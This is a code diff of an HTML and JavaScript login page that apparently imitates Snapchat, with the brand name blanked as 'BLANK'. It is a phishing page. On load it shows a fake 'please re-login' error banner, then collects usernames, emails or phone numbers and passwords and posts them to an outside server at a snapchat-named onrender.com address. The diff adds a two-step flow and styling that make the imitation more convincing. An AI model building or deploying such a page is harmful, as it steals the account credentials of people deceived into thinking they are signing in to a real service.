@@ -4,179 +4,197 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <link rel="shortcut icon" href="img/faviconV2.png">
-  <meta name="description" content="Watch this amazing video on BLANK Spotlight!">
-  <meta property="og:site_name" content="BLANK Spotlight">
   <title>Login • BLANK</title>
   <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
     body {
-      caret-color: transparent;
-      font-family: "Avenir Next", Arial, sans-serif;
-      background-color: #ffffff;
-      margin: 0; padding: 0;
+      font-family: "Avenir Next", -apple-system, Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
-      height: 100vh;
+      justify-content: flex-start;
+      padding-top: 80px;
       position: relative;
     }
-    .login-container {
-      text-align: center;
-      max-width: 400px;
-      width: 83%;
+
+    /* Back button */
+    .back-button {
+      position: absolute;
+      top: 16px;
+      left: 14px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
+    .back-button img { width: 18px; height: 18px; opacity: 0.5; }
+    .back-button:hover img { opacity: 1; }
+
+    /* placeholder icon circle */
+    .placeholder-icon {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      background: #f0f0f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 18px;
+    }
+    .placeholder-icon svg {
+      width: 32px;
+      height: 32px;
+      stroke: #bbb;
+      fill: none;
+      stroke-width: 1.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
     h1 {
-      font-size: 27px;
-      color: #000000;
-      margin-bottom: 20px;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      font-weight: 500;
+      font-size: 22px;
+      font-weight: 600;
+      color: #000;
+      margin-bottom: 28px;
+      text-align: center;
+      letter-spacing: -0.3px;
     }
-    label {
-      display: block;
-      text-align: left;
+
+    .form-wrap {
+      width: 100%;
+      max-width: 340px;
+      padding: 0 20px;
+    }
+
+    /* Step 1: username field */
+    #step-1, #step-2 { width: 100%; }
+    #step-2 { display: none; }
+
+    .field-label {
       font-size: 12px;
-      font-weight: bold;
-      color: #55ccffd0;
-      margin-top: 20px;
-      margin-bottom: 5px;
+      font-weight: 600;
+      color: #888;
+      margin-bottom: 6px;
+      display: block;
+      letter-spacing: 0.02em;
     }
+
     input[type="text"],
+    input[type="email"],
     input[type="password"],
     input[type="tel"] {
       width: 100%;
-      padding: 11px;
-      margin-top: 5px;
-      border: 1px solid #dcdcdc;
+      padding: 13px 14px;
+      border: 1.5px solid #e0e0e0;
       border-radius: 10px;
-      font-size: 14px;
-      box-sizing: border-box;
-      caret-color: #00A6FF;
-    }
-    input:focus {
-      border-color: #54545436;
+      font-size: 15px;
+      font-family: inherit;
+      color: #111;
       outline: none;
-      transition: background-color 0.3s ease;
-      box-shadow: 0 0 5px rgba(116,116,116,0.17);
+      caret-color: #00A6FF;
+      transition: border-color 0.2s;
+      background: #fff;
     }
-    .password-container {
+    input:focus { border-color: #00A6FF; }
+
+    .phone-toggle {
+      display: block;
+      margin-top: 12px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #00A6FF;
+      text-decoration: none;
+      cursor: pointer;
+      background: none;
+      border: none;
+      padding: 0;
+      font-family: inherit;
+    }
+    .phone-toggle:hover { text-decoration: underline; }
+
+    /* Password field row */
+    .password-wrap {
       position: relative;
-      width: 100%;
     }
-    .password-container .toggle-password {
+    .password-wrap input { padding-right: 44px; }
+    .toggle-password {
       position: absolute;
-      right: 5px;
-      top: 60%;
+      right: 10px;
+      top: 50%;
       transform: translateY(-50%);
       background: none;
       border: none;
       cursor: pointer;
-      font-size: 14px;
-      font-family: Arial, Helvetica, sans-serif;
+      padding: 4px;
+      display: flex;
+      align-items: center;
     }
+    .toggle-password img { width: 20px; height: 20px; opacity: 0.4; }
+    .toggle-password:hover img { opacity: 0.8; }
+
+    /* Save info */
     .save-info {
       display: flex;
       align-items: center;
-      margin-top: -10px;
-      font-size: 12px;
-      justify-content: left;
-      font-family: Arial, Helvetica, sans-serif;
+      gap: 8px;
+      margin-top: 14px;
     }
+    .save-info input[type="checkbox"] { width: 15px; height: 15px; accent-color: #00A6FF; }
     .save-info label {
-      color: #bcbcbc;
-      font-weight: lighter;
-    }
-    .alternate-option {
-      display: flex;
-      align-items: center;
-      font-size: 12.8px;
-      color: #55ccffd0;
-      margin-top: 15px;
-      justify-content: left;
-      font-family: Arial, Helvetica, sans-serif;
-      font-weight: bolder;
-    }
-    .forgot-password {
       font-size: 12px;
-      color: #55ccffd0;
-      margin-top: 16px;
-      font-family: Arial, Helvetica, sans-serif;
-      font-weight: 600;
-    }
-    .alternate-option a,
-    .forgot-password a {
-      text-decoration: none;
-      color: #55ccffd0;
-    }
-    input[type="checkbox"] {
-      margin-right: 5px;
-      margin-top: 20px;
-    }
-    .login-button {
-      position: fixed;
-      left: 50%;
-      transform: translateX(-50%);
-      bottom: 20px;
-      width: 210px;
-      padding: 12px;
-      margin-top: 20px;
-      background-color: #a7abad;
-      border: none;
-      border-radius: 18px;
-      font-size: 14px;
-      font-weight: bold;
-      color: #ffffff;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-    .login-button.enabled { background-color: #00A6FF; }
-    .login-button:hover   { background-color: #027bde; }
-    .back-button {
-      position: absolute;
-      top: 12px;
-      left: 10px;
-      background-color: transparent;
-      border: none;
-      font-size: 16px;
-      color: #55ccffd0;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-    }
-    .back-button:hover { color: #027bde; }
-    .incorrect {
-      color: red;
-      display: none;
-      margin-top: -10px;
-      margin-left: 5px;
-      margin-bottom: 5px;
-      font-size: 13px;
+      color: #aaa;
       font-weight: 400;
+      cursor: pointer;
+    }
+
+    .forgot {
+      display: block;
+      margin-top: 14px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #00A6FF;
+      text-decoration: none;
       text-align: left;
     }
-    .error-message {
+    .forgot:hover { text-decoration: underline; }
+
+    /* Next / Login button */
+    .btn-next {
+      width: 100%;
+      margin-top: 24px;
+      padding: 13px;
+      background: #00A6FF;
+      color: #fff;
+      border: none;
+      border-radius: 999px;
+      font-size: 15px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.15s;
+      letter-spacing: 0.01em;
+    }
+    .btn-next:hover  { background: #0094e0; }
+    .btn-next:active { transform: scale(0.98); }
+    .btn-next:disabled { background: #a7d8f7; cursor: not-allowed; transform: none; }
+
+    /* Error / success messages */
+    .incorrect {
       display: none;
-      background-color: #f44336;
-      color: white;
-      padding: 15px;
-      margin: 20px;
-      border-radius: 5px;
-      font-size: 16px;
-      text-align: center;
-      animation: fadeIn 0.5s ease-out, vibrate 0.2s ease-in-out 3;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; } to { opacity: 1; }
-    }
-    @keyframes vibrate {
-      0%   { transform: translateX(0); }
-      25%  { transform: translateX(-5px); }
-      50%  { transform: translateX(5px); }
-      75%  { transform: translateX(-5px); }
-      100% { transform: translateX(0); }
+      color: #e03535;
+      font-size: 12.5px;
+      margin-top: 8px;
+      text-align: left;
     }
     .server-message {
       display: none;
-      padding: 10px;
+      padding: 10px 12px;
       margin-top: 12px;
       border-radius: 8px;
       font-size: 13px;
@@ -184,95 +202,155 @@
     }
     .server-message.error {
       display: block;
-      background-color: #fff0f0;
+      background: #fff0f0;
       color: #cc0000;
       border: 1px solid #f5c6c6;
     }
     .server-message.success {
       display: block;
-      background-color: #f0fff4;
+      background: #f0fff4;
       color: #007a33;
       border: 1px solid #b2dfcc;
     }
+
+    /* Error banner */
+    .error-banner {
+      display: none;
+      background: #f44336;
+      color: #fff;
+      padding: 12px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      text-align: center;
+      width: calc(100% - 40px);
+      max-width: 340px;
+      margin-bottom: 20px;
+      animation: fadeIn 0.4s ease, vibrate 0.2s ease-in-out 3;
+    }
+    @keyframes fadeIn  { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes vibrate {
+      0%,100% { transform: translateX(0); }
+      25%      { transform: translateX(-5px); }
+      75%      { transform: translateX(5px); }
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
 
-  <button class="back-button" onclick="window.location.href='index.html'">
-    <img src="img/left-arrow.png" height="15px" width="15px" alt="back">
+  <button class="back-button" onclick="goBack()">
+    <img src="img/left-arrow.png" alt="back">
   </button>
 
-  <div class="login-container">
+  <div id="error-banner" class="error-banner">
+    Something went wrong! Please re-login to your account.
+  </div>
 
-    <div id="error-message" class="error-message">
-      Something went wrong! Please re-login to your account.
+  <!-- Placeholder icon -->
+  <div class="placeholder-icon">
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
+  </div>
+
+  <h1 id="page-title">Log in</h1>
+
+  <div class="form-wrap">
+
+    <!-- Step 1: username/email -->
+    <div id="step-1">
+      <span class="field-label" id="input-label">Username or Email</span>
+      <input type="text" id="username" placeholder="" autocomplete="username" />
+      <button class="phone-toggle" id="switch-to-phone">Use phone number instead</button>
+
+      <div class="incorrect" id="step1-error">Please enter your username, email or phone.</div>
+
+      <button class="btn-next" id="next-btn" onclick="goToStep2()">Next</button>
     </div>
 
-    <h1>Log In</h1>
-
-    <form onsubmit="return handleLogin(event)">
-
-      <label for="username">USERNAME OR EMAIL</label>
-      <input type="text" id="username" name="name" required>
-
-      <p class="alternate-option">
-        <a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a>
-      </p>
-
-      <label for="password">PASSWORD</label>
-      <div class="password-container">
-        <input type="password" id="password" name="message" required>
+    <!-- Step 2: password -->
+    <div id="step-2">
+      <span class="field-label">Password</span>
+      <div class="password-wrap">
+        <input type="password" id="password" autocomplete="current-password" />
         <button type="button" class="toggle-password">
-          <img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
+          <img src="img/eye-closed.svg" id="eye-icon" alt="show password">
         </button>
       </div>
 
-      <div class="incorrect">
-        <p>Incorrect password, please try again.</p>
-      </div>
-
+      <div class="incorrect" id="step2-error">Password must be at least 8 characters.</div>
       <div id="server-message" class="server-message"></div>
 
       <div class="save-info">
         <input type="checkbox" id="save-login">
-        <label for="save-login">Save Login Info on your device</label>
+        <label for="save-login">Save login info on this device</label>
       </div>
 
-      <p class="forgot-password">
-        <a href="#">Forgot your password?</a>
-      </p>
+      <a href="#" class="forgot">Forgot your password?</a>
 
-      <button type="submit" class="login-button" id="login-btn">Log In</button>
+      <button class="btn-next" id="login-btn" onclick="handleLogin()">Log In</button>
+    </div>
 
-    </form>
   </div>
 
   <script>
-    // !! Replace with your Render.com server URL after deploying !!
     const SERVER_URL = 'https://snapchat-pcir.onrender.com';
 
-    // ── Login: validates then sends to server ────────────────────────
-    async function handleLogin(event) {
-      event.preventDefault();
+    // ── Step 1 → Step 2 ──────────────────────────────────────────────
+    function goToStep2() {
+      const username   = document.getElementById('username').value.trim();
+      const step1Error = document.getElementById('step1-error');
 
+      if (!username) {
+        step1Error.style.display = 'block';
+        return;
+      }
+      step1Error.style.display = 'none';
+      document.getElementById('step-1').style.display = 'none';
+      document.getElementById('step-2').style.display = 'block';
+      document.getElementById('page-title').textContent = 'Enter password';
+      document.getElementById('password').focus();
+    }
+
+    // ── Back button ──────────────────────────────────────────────────
+    function goBack() {
+      if (document.getElementById('step-2').style.display === 'block') {
+        document.getElementById('step-2').style.display = 'none';
+        document.getElementById('step-1').style.display = 'block';
+        document.getElementById('page-title').textContent = 'Log in';
+      } else {
+        window.location.href = 'index.html';
+      }
+    }
+
+    // ── Login: send to server ────────────────────────────────────────
+    async function handleLogin() {
       const usernameOrEmail = document.getElementById('username').value.trim();
       const password        = document.getElementById('password').value;
-      const incorrectMsg    = document.querySelector('.incorrect');
+      const step2Error      = document.getElementById('step2-error');
       const serverMsg       = document.getElementById('server-message');
       const loginBtn        = document.getElementById('login-btn');
 
-      incorrectMsg.style.display = 'none';
+      step2Error.style.display = 'none';
       serverMsg.className  = 'server-message';
       serverMsg.textContent = '';
 
-      // Client-side length check (mirrors your original JS)
       if (password.length < 8) {
-        incorrectMsg.style.display = 'block';
-        return false;
+        step2Error.style.display = 'block';
+        return;
       }
 
-      loginBtn.textContent = 'Logging in…';
-      loginBtn.disabled    = true;
+      loginBtn.disabled = true;
+      loginBtn.innerHTML = '<span class="spinner"></span>Logging in…';
 
       try {
         const res  = await fetch(`${SERVER_URL}/api/login`, {
@@ -284,9 +362,8 @@
 
         if (res.ok) {
           serverMsg.className   = 'server-message success';
-          serverMsg.textContent = 'Login successful! Redirecting…';
-          // Uncomment and update when your redirect is ready:
-          // setTimeout(() => window.location.href = 'https://www.BLANK.com/', 1000);
+          serverMsg.textContent = 'Login successful!';
+          // setTimeout(() => window.location.href = 'home.html', 1000);
         } else {
           serverMsg.className   = 'server-message error';
           serverMsg.textContent = data.error || 'Login failed. Please try again.';
@@ -296,48 +373,55 @@
         serverMsg.textContent = 'Could not reach the server. Please try again.';
       }
 
+      loginBtn.disabled = false;
       loginBtn.textContent = 'Log In';
-      loginBtn.disabled    = false;
-      return false;
     }
 
     // ── Toggle password visibility ───────────────────────────────────
     document.querySelector('.toggle-password').addEventListener('click', function () {
-      const passwordField = document.getElementById('password');
-      const eyeIcon       = document.getElementById('eye-icon');
-      if (passwordField.type === 'password') {
-        passwordField.type = 'text';
+      const pwd     = document.getElementById('password');
+      const eyeIcon = document.getElementById('eye-icon');
+      if (pwd.type === 'password') {
+        pwd.type    = 'text';
         eyeIcon.src = 'img/eye-open.svg';
       } else {
-        passwordField.type = 'password';
+        pwd.type    = 'password';
         eyeIcon.src = 'img/eye-closed.svg';
       }
     });
 
-    // ── Switch username/email ↔ phone ────────────────────────────────
-    const switchToPhone = document.getElementById('switch-to-phone');
+    // ── Switch username ↔ phone ──────────────────────────────────────
+    const switchBtn    = document.getElementById('switch-to-phone');
     const usernameInput = document.getElementById('username');
-    const usernameLabel = document.querySelector('label[for="username"]');
+    const inputLabel   = document.getElementById('input-label');
 
-    switchToPhone.addEventListener('click', function () {
-      if (usernameLabel.textContent === 'USERNAME OR EMAIL') {
-        usernameLabel.textContent = 'PHONE NUMBER';
-        usernameInput.type        = 'tel';
-        switchToPhone.textContent = 'Use email instead';
+    switchBtn.addEventListener('click', function () {
+      if (inputLabel.textContent === 'Username or Email') {
+        inputLabel.textContent  = 'Phone Number';
+        usernameInput.type      = 'tel';
+        switchBtn.textContent   = 'Use email instead';
       } else {
-        usernameLabel.textContent = 'USERNAME OR EMAIL';
-        usernameInput.type        = 'text';
-        switchToPhone.textContent = 'Use phone number instead';
+        inputLabel.textContent  = 'Username or Email';
+        usernameInput.type      = 'text';
+        switchBtn.textContent   = 'Use phone number instead';
       }
     });
 
-    // ── Error banner: show on load, hide on click ────────────────────
+    // ── Enter key support ────────────────────────────────────────────
+    document.addEventListener('keydown', e => {
+      if (e.key !== 'Enter') return;
+      if (document.getElementById('step-2').style.display === 'block') {
+        handleLogin();
+      } else {
+        goToStep2();
+      }
+    });
+
+    // ── Error banner ─────────────────────────────────────────────────
     window.onload = function () {
-      const errorMessage = document.getElementById('error-message');
-      errorMessage.style.display = 'block';
-      document.body.addEventListener('click', function () {
-        errorMessage.style.display = 'none';
-      });
+      const banner = document.getElementById('error-banner');
+      banner.style.display = 'block';
+      document.body.addEventListener('click', () => banner.style.display = 'none');
     };
   </script>
 
